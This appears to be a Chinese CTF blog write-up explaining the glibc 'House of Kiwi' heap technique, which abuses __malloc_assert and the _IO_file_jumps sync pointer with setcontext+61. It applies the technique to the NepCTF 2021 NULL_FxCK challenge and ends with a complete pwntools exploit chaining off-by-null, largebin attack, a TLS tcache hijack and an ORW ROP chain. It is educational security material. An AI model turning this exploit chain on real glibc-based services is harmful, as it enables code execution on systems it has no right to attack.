---
title: 【IO_FILE】House of kiwi
index_img: img/article/house_of_kiwi/image-20221026101620627-1666750587623-2.png
excerpt: glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用_IO_file_jumps中的sync指针
---

## 前言

> 参考博客如下：
>
> [从PWN题NULL_FXCK中学到的glibc知识](https://bbs.pediy.com/thread-273746.htm)
>
> [House OF Kiwi](https://www.anquanke.com/post/id/235598)

CTF的Pwn题里面,通常就会遇到一些加了沙盒的题目,这种加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式

- 劫持`__free_hook`,利用特定的gadget,将栈进行迁移
- 劫持`__malloc_hook`为`setcontext+61`的gadget,以及劫持`IO_list_all`单链表中的指针在exit结束中,在`_IO_cleanup`函数会进行缓冲区的刷新,从而读取flag

因为`setcontext + 61`从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据

```assembly
<setcontext+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
<setcontext+68>:    mov    rbx,QWORD PTR [rdx+0x80]
<setcontext+75>:    mov    rbp,QWORD PTR [rdx+0x78]
<setcontext+79>:    mov    r12,QWORD PTR [rdx+0x48]
<setcontext+83>:    mov    r13,QWORD PTR [rdx+0x50]
<setcontext+87>:    mov    r14,QWORD PTR [rdx+0x58]
<setcontext+91>:    mov    r15,QWORD PTR [rdx+0x60]
<setcontext+95>:    test   DWORD PTR fs:0x48,0x2
<setcontext+107>:    je     0x7ffff7e31156 <setcontext+294>
...
<setcontext+294>:    mov    rcx,QWORD PTR [rdx+0xa8]
<setcontext+301>:    push   rcx
<setcontext+302>:    mov    rsi,QWORD PTR [rdx+0x70]
<setcontext+306>:    mov    rdi,QWORD PTR [rdx+0x68]
<setcontext+310>:    mov    rcx,QWORD PTR [rdx+0x98]
<setcontext+317>:    mov    r8,QWORD PTR [rdx+0x28]
<setcontext+321>:    mov    r9,QWORD PTR [rdx+0x30]
<setcontext+325>:    mov    rdx,QWORD PTR [rdx+0x88]
<setcontext+332>:    xor    eax,eax
<setcontext+334>:    ret
```

但是如果将exit函数替换成`_exit`函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用`_IO_cleanup`,若再将`__malloc_hook`和`__free_hook`给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了

## 利用条件

- 能够触发`_malloc_assert`，通常由堆溢出导致
- 能够任意地址写，修改 `_IO_file_sync` 和`IO_helper_jumps + 0xA0 and 0xA8`

## 利用原理

`glibc`中`ptmalloc`部分,从以前到现在都存在一个`assret`断言的问题,此处存在一个`fflush(stderr)`的函数调用,其中会调用`_IO_file_jumps`中的`sync`指针

> GLibc 2.32/malloc:288

```c
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
       const char *function)
{
(void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
           __progname, __progname[0] ? ": " : "",
           file, line,
           function ? function : "", function ? ": " : "",
           assertion);
fflush (stderr);
abort ();
}
```

>  这里放一个我常用来查询glibc源码的网址：[Glibc source code - Bootlin](https://elixir.bootlin.com/glibc/latest/source)

![image-20221026101620627](img/article/house_of_kiwi/image-20221026101620627-1666750587623-2.png)

在`_int_malloc`中存在一个 assert (chunk_main_arena (bck->bk));位置可以触发,此外当`top_chunk`的大小不够分配时,则会进入sysmalloc中

> GLIBC 2.32/malloc.c:2394

```c
......
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
......
```

此处会对top_chunk的`size|flags`进行assert判断

- old_size >= 0x20;
- old_top.prev_inuse = 0;
- old_top页对齐

通过这里也可以触发assert
下面手动实现进入assert后,可以想到fflush和fxprintf都和IO有关,可能需要涉及IO,一步步调试看看可以发现在`fflush`函数中调用到了一个指针:位于`_IO_file_jumps`中的`_IO_file_sync`指针,且观察发现RDX寄存器的值为`IO_helper_jumps`指针,多次调试发现RDX始终是一个固定的地址

![img](img/article/house_of_kiwi/t01f675c08902cf9575.png)

如果存在一个任意写,通过修改 `_IO_file_jumps + 0x60`的`_IO_file_sync`指针为`setcontext+61`
修改`IO_helper_jumps + 0xA0 and 0xA8`分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移

## 例题介绍

> 以NepCTF 2021年中NULL_FxCK为例

### 题目分析

#### 沙箱开启

![image-20221026134222730](img/article/house_of_kiwi/image-20221026134222730.png)

#### 保护全开

![image-20221026134910200](img/article/house_of_kiwi/image-20221026134910200.png)

#### 禁用malloc_hook, free_hook

![ban!!!](img/article/house_of_kiwi/image-20221026135700420.png)

#### 漏洞分析

> 整个程序只有在modify里有一次off by null 的机会，无其他漏洞



### 思路整理

这里的思路其实有点公式化的味道，就和我们做数学题一样，都是通过题目给的条件来思考利用的手法。给了off_by_null就思考会用到堆块的合并导致的重叠。重叠带来的好处：

- 通过切割堆块能使我们在合并的堆块内部任意地址写main_arena，这个任意地址可能是note数组的一个堆指针的fd，那么我们就可以泄露libc了
- 合并的时候的unlink能使得我们在已知堆块的fd和bk上写一个堆地址，这样就可以弥补一开始的截断带来的不能泄露堆块，然后成功泄露出堆块了

#### 堆风水泄露libc和堆地址

首先伪造一个chunk头，利用off by null unlink吞并几个Allocated状态的chunk. 然后add分割使得chunk进入unsortedbin，从而泄露libc. 同时包含，largebin中提前包含heap信息，从而泄露heap地址

#### house of wiki

发现这题中的`exit`被换成了`_exit`，而`_exit`是不会存在`house of pig`里面的那条链子的，它直接就是一个`exit`的系统调用然后程序就结束了，所以任何打`exit`的链子都不能直接拿来用。遇到这种问题，有的师傅就开辟了一条名为`house of kiwi`的链子。主要是打`__malloc_assert`断言，有一个位于`_IO_file_jumps+0x60`的稳定的跳转指针`sync`和稳定的`rdx——_IO_helper_jumps`，而且这两个地方在gdb里都是有符号表的（比banana好找多了2333）：

![偏移确定](img/article/house_of_kiwi/image-20221026150024215.png)

那么我们通过两次任意地址写就行了？非也。因为还需要触发assert，看看malloc.c的源码，ctrl f输入"assert"。发现有80多个。这里介绍其中一种做法：当top_chunk的大小不够分配时,则会进入sysmalloc中

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
```

发现很多检测，我们注意到对topchunk的prev_inuse的检测，只要把topchunk的size位的prev_inuse置为0，申请一个比它大的堆块就可以触发了。我们发现，至少需要改三个地址，也就是执行三次任意地址写。从这道题的严苛条件，不能用tcache poison等简单手法。

#### TLS段tcache struct attack

我们都知道，malloc_init会在heapbase段开设一个内存用于管理tcache。而这个管理tcache的地址，是可以从heapbase被我们劫持到另一个地方的，这是因为实际寻找的时候，是找到TLS段的管理tcache的地址，只不过malloc_init函数预设成了heapbase+0x10而已（注意，是heapbase+0x10而不是heapbase），我们可以在gdb中找到这段区域：

![image-20221026151700771](img/article/house_of_kiwi/image-20221026151700771.png)

通过`largebin attack`劫持这段为可控堆块，在上面布置任何我们想写的东西，`malloc`对应位置size大小就能够申请出来并且改写了（这里的偏移要调一调，不过也可以拿exp的模板直接来用，也就是）

通过改稳定的跳表sync为setcontext+61(因为setcontext会将[rdx+0xa0]设置为rsp，将[rdx+0xa8]设置为rip)，将稳定的rdx `_IO_helper_jumps`设置为`_IO_helper_jumps+0xa0`为存orw链，+0xa8为ret指令，并改top_chunk的size，然后申请一个比它的size大的堆块触发assert就可get_shell了

### 总结

> 这道题考察了高版本的off_by_null，large bin attack，house of kiwi ， TLS attack

#### exp

```python
# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './NULL_FXCK'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size , Content = '\x00'):
    cmd(1)
    sla('Size: ' , size)
    sa('Content:' , Content)

def edit(idx , Content):
    cmd(2)
    sla('Index: ' , idx)
    sla('Content:' , Content)

def delete(idx ):
    cmd(3)
    sla('Index: ' , idx)

def show(idx ):
    cmd(4)
    sla('Index: ' , idx)


# one_gad = one_gadget(libc.path)
# 本质是通过 unsorted bin 或者 large bin 的指针残留构造 unlink 的指针指向

add(0x418)
add(0x108)
add(0x418) #2
add(0x438) #3
add(0x208) #4
add(0x428) #5
add(0x418) #6

delete(0)
delete(3)
delete(5)

delete(2)

# unsorted bin 合并 ，但合并不会清空数据，某处有残留的堆地址

add(0x438, 'a' * 0x418 +  p64( 0x420 + 0x210 + 0x430 + 0x420 + 0x20 + 1)) #0

# 0xa91 写到了原来 chunk3 的 size 处，刚好这下面有残留的堆地址
# 切割已经合并的大块
# unsorted bin 从新到旧排序

add(0x418) #2
add(0x428) #3
add(0x418) #5

# 下面构造 fack fd 
delete(5)
delete(2)
add(0x418 , 'a'*9) #2
add(0x418) #5

# 下面构造 fack bk

delete(5)
delete(3)

add(0x9f8) #3
add(0x428 , 'a') #5
add(0x418) #7

# 下面进行 unlink
add(0x408, p64(0) + p64(0x411)) #8
edit(6, 'a' * 0x410 + p64(0x210 +0x430 + 0x420 + 0x420 + 0x20 ))
delete(3)

add(0x438 , flat(0 , 0 ,0 , 0x421)) #3
add(0x1600) #9

show(4)
__malloc_hook = l64() - 1644 - 0x40 - 4
libc.address = __malloc_hook - libc.sym['__malloc_hook']
_environ = libc.sym['_environ']
mp_ = libc.address + 0x1e3280
_IO_list_all = libc.sym['_IO_list_all']
_IO_str_jumps = libc.address + 0x1e5580
_IO_file_jumps = libc.address + 0x1e54c0
_IO_helper_jumps = libc.address + 0x1e48c0
setcontext = libc.sym['setcontext'] + 61

show(5)
heap_base = u64(p.recv(6).ljust( 8 , '\x00')) - 0x2b0

ptr_list = 0x4160
lg('__malloc_hook' , __malloc_hook)
lg('heap_base',heap_base)

# ptr_list = $rebase(0x000000000004160)

add(0x1458 , flat('\x00'*0x208 , 0x431 , '\x00'*0x428 , 0x421 , '\x00'*0x418 , 0xa01) )

delete(4)
delete(5)

add(0x1458  )
add(0x448)

delete(4)
add(0x1458 , flat('\x00'*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , _IO_list_all - 0x20 ) )

delete(2)
add(0x448)
add(0x418)

delete(0)
add(0x438 , '\x00'*0x2c0 + p64(_IO_file_jumps + 96) + '\x00'*0x98 + flat(_IO_helper_jumps + 0xa0 , heap_base + 0x4bb0 ) ) #设置 entry

delete(4)
add(0x1458 , flat('\x00'*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , mp_ + 80 - 0x20 ) )
delete(11)


read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
leave_ret = libc.search(asm('leave;ret')).next()
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
ret = pop_rdi_ret + 1

flag_addr = heap_base + 0x4770 + 0x100
chain = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
).ljust(0x100,'\x00') + 'flag\x00'
# len chain 0x80

# dbg()
add(0x448 , chain) # copy
add(0x418)

# House of kiwi 三大条件


add(0x1450 , p64(setcontext)[:-1])

add(0x1590 , flat( heap_base + 0x4770 , ret ))
add(0x15a0 , flat( 0 , 0x3e0))
# 0x1450 0x1590 0x15a0
# dbg()

# dbg()
cmd(1)
sla('Size' , 0x1000)

p.interactive()
```



